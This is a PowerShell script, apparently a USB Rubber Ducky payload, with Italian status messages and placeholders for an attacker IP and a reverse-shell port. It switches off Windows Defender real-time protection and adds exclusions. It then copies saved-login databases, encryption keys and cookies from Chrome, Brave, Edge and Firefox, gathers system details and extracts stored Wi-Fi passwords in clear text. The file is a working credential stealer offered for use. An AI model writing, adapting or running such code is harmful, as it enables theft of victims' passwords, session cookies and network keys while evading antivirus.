

#-- Payload configuration --#

$DRIVE = 'DUCKY'          # Drive letter of the USB Rubber Ducky
$IP = 'YOUR_IP'     # IP address of the attacker machine
$PORT = 'YOUR_PORT'            # Port to use for the reverse shell


# Set destination directory



$duckletter = "C:\Users\$env:USERPROFILE\Downloads\tmp"
Set-Location $duckletter

Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath "${duckletter}\"
Set-MpPreference -ExclusionExtension "ps1"

$destDir = "C:\Users\$env:USERPROFILE\Downloads\tmp"
if (-Not (Test-Path $destDir)) {
    New-Item -ItemType Directory -Path $destDir
}

# Function to copy browser files
function CopyBrowserFiles($browserName, $browserDir, $filesToCopy) {
    $browserDestDir = Join-Path -Path $destDir -ChildPath $browserName
    if (-Not (Test-Path $browserDestDir)) {
        New-Item -ItemType Directory -Path $browserDestDir
    }

    foreach ($file in $filesToCopy) {
        $source = Join-Path -Path $browserDir -ChildPath $file
        if (Test-Path $source) {
            Copy-Item -Path $source -Destination $browserDestDir
            Write-Host "$browserName - File copiato: $file"
        } else {
            Write-Host "$browserName - File non trovato: $file"
        }
    }
}

# Configuration for Google Chrome
$chromeDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
$chromeFilesToCopy = @("Login Data")
CopyBrowserFiles "Chrome" $chromeDir $chromeFilesToCopy
Copy-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Chrome") -ErrorAction SilentlyContinue

# Configuration for Brave
$braveDir = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
$braveFilesToCopy = @("Login Data")
CopyBrowserFiles "Brave" $braveDir $braveFilesToCopy
Copy-Item -Path "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Brave") -ErrorAction SilentlyContinue

# Configuration for Firefox
$firefoxProfileDir = Join-Path -Path $env:APPDATA -ChildPath "Mozilla\Firefox\Profiles"
$firefoxProfile = Get-ChildItem -Path $firefoxProfileDir -Filter "*.default-release" | Select-Object -First 1
if ($firefoxProfile) {
    $firefoxDir = $firefoxProfile.FullName
    $firefoxFilesToCopy = @("logins.json", "key4.db", "cookies.sqlite", "webappsstore.sqlite", "places.sqlite")
    CopyBrowserFiles "Firefox" $firefoxDir $firefoxFilesToCopy
} else {
    Write-Host "Firefox - Nessun profilo trovato."
}

# Configuration for Microsoft Edge
$edgeDir = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
$edgeFilesToCopy = @("Login Data")
CopyBrowserFiles "Edge" $edgeDir $edgeFilesToCopy
Copy-Item -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Edge") -ErrorAction SilentlyContinue

# Gather additional system information
function GatherSystemInfo {
    $sysInfoDir = "$destDir"
    if (-Not (Test-Path $sysInfoDir)) {
        New-Item -ItemType Directory -Path $sysInfoDir
    }

    Get-ComputerInfo | Out-File -FilePath "$sysInfoDir\computer_info.txt"
    Get-Process | Out-File -FilePath "$sysInfoDir\process_list.txt"
    Get-Service | Out-File -FilePath "$sysInfoDir\service_list.txt"
    Get-NetIPAddress | Out-File -FilePath "$sysInfoDir\network_config.txt"
}

GatherSystemInfo

# Network scanning


# Retrieve Wi-Fi passwords
function GetWifiPasswords {
    $wifiProfiles = netsh wlan show profiles | Select-String "\s:\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }

    $results = @()

    foreach ($profile in $wifiProfiles) {
        $profileDetails = netsh wlan show profile name="$profile" key=clear
        $keyContent = ($profileDetails | Select-String "Key Content\s+:\s+(.*)$").Matches.Groups[1].Value
        $results += [PSCustomObject]@{
            ProfileName = $profile
            KeyContent  = $keyContent
        }
    }

    $results | Format-Table -AutoSize

    # Save results to a file
    $results | Out-File -FilePath "$destDir\WiFi_Details.txt"
}

GetWifiPasswords

# Re-enable Windows Defender real-time monitoring
Set-MpPreference -DisableRealtimeMonitoring $false

exit

